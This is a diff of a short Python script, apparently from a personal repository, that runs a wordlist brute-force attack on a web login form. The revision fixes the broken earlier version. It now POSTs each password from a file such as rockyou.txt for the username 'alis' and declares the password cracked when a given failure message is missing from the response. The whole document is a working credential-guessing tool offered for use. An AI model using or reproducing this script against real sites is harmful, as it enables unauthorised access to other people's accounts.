@@ -1,34 +1,36 @@
 import requests
 import sys
-import threading
 
-file_list = ["rockyou.txt","password.txt"]
-def mother(url,identifier):
-    for file in file_list:
-        data = ""
-        def Cracker(url,identifier):
-            f = open(file,"r")
-            lines = f.readlines()
-            for line in lines: 
-                r = requests.get(url,data=data)
-                res_text = r.text
-                if identifier not in res_text:
-                    print("PASSWORD IS CRACKED SUCCESFULLY!")
-                    sys.stdout.write(f"(+) password => {line}")
-                else:
-                    sys.stdout.write("\r"+line)
-        Cracker(url,identifier)
+def Cracker(url,identifier,file):
+    f = open(file,"rb")
+    line = f.readlines()
+    for line in line:
+        data = {"username":"alis","password":f"{line.decode()}"}
+        r = requests.post(url,data=data)
+        res_text = r.text
+        if identifier not in res_text:
+            print("PASSWORD IS CRACKED SUCCESFULLY!")
+            sys.stdout.write("(+) password =>"+"\r"+ f"{line.decode()}")
+            sys.stdout.flush()
+            break
+        else:
+            print("Password =>"+line.decode())
+            sys.stdout.write("\033[F")
+            sys.stdout.flush()
+
+
 def main():
-    if(len.argv) != 3:
-        print("(+) Usage: %s <url> <identifier>" % sys.argv[0])
-        print("(+) Example: %s www.example.com Invalid password"% sys.argv[0])
-
-    url = sys.arg[1]
-    identifier = sys.arg[2]
+    if len(sys.argv) != 4:
+        print("(+) Usage: %s <url> <identifier> <file_name>" % sys.argv[0])
+        print("(+) Example: %s www.example.com Invalid password rockyou.txt"% sys.argv[0])
+    
+    url = sys.argv[1]
+    identifier = sys.argv[2] 
+    file = sys.argv[3]
     print("(+) Retrieving password.....")
-    t1 = threading.Thread(target=mother,args=(url,identifier))
-    t1.start()
-
+    Cracker(url,identifier,file)
+    
+        
 if __name__ == "__main__":
     main()
     
